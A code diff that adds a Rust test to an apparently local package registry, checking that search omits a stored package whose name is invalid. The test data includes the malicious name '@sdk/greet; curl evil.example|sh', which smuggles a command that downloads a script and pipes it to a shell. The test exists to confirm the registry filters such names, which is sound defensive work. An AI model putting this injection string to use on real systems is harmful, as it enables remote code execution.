@@ -112,3 +112,41 @@ fn a_stored_signature_reads_back_typed() {
     .unwrap();
     assert_eq!(metadata.signature, Some(signature));
 }
+
+#[specforge_test_macros::test(
+    behavior = "search_registry",
+    verify = "a registry serves no stored package whose name is no package name"
+)]
+fn search_serves_no_stored_row_whose_name_is_no_package_name() {
+    use specforge_registry_wire::SearchQuery;
+    let registry = LocalRegistry::start();
+    for (name, version) in [
+        ("@sdk/greet; curl evil.example|sh", "9.9.9"),
+        ("@sdk/good", "1.0.0"),
+    ] {
+        registry.store(
+            &PackageMetadata {
+                name: name.into(),
+                version: version.into(),
+                sha256: "0".into(),
+                wasm_url: "ignored".into(),
+                ..Default::default()
+            },
+            b"\0asm",
+        );
+    }
+
+    let reply: serde_json::Value = get(&registry
+        .root()
+        .address(&Call::Search(&SearchQuery::new("sdk"))))
+    .json()
+    .unwrap();
+
+    let names: Vec<&str> = reply["results"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|hit| hit["name"].as_str().unwrap())
+        .collect();
+    assert_eq!(names, ["@sdk/good"]);
+}
